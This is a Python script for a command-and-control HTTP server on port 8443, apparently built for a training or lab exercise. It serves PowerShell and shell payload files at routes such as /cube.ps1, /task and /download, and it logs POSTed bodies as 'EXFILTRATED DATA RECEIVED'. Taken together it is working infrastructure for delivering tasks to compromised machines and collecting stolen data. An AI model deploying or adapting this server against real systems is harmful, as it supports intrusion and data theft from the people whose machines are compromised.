import sys
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

ASSET_DIR = Path(__file__).resolve().parent

STATIC_ROUTES = {
    "/cube.ps1": ("cube.ps1", "text/plain"),
    "/download": ("cybersecurity4dummies.sh", "text/plain"),
    "/task": ("task.ps1", "text/plain"),
}


class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        sys.stdout.write(
            "%s - - [%s] %s\n"
            % (self.address_string(), self.log_date_time_string(), format % args)
        )
        sys.stdout.flush()

    def _respond(self, body=b"", content_type="text/plain"):
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = self.path.split("?")[0]

        if path == "/":
            self._respond((ASSET_DIR / "index.html").read_bytes(), "text/html")
            return

        route = STATIC_ROUTES.get(path)
        if route is not None:
            filename, content_type = route
            try:
                body = (ASSET_DIR / filename).read_bytes()
            except FileNotFoundError:
                body = b""
            self._respond(body, content_type)
            return

        self._respond()

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length).decode("utf-8", errors="replace")
        self._respond()
        sys.stdout.write(f"\n[+] EXFILTRATED DATA RECEIVED:\n{post_data}\n\n")
        sys.stdout.flush()


if __name__ == "__main__":
    HTTPServer(("0.0.0.0", 8443), C2Handler).serve_forever()
